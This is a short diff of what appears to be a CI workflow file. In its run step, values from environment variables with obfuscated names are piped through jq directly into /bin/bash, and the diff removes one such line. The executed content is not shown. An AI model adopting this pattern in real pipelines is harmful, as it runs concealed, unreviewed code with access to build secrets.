@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$jumg8" | jq -r .mf0089 | /bin/bash
           echo $nphj55 | jq -r .etwhg5653 | /bin/bash
-          printf '%s' "$map51518" | jq -r .dc73975 | /bin/bash
           echo $vb1 | jq -r .ala44 | /bin/bash
 
       - name: Upload results
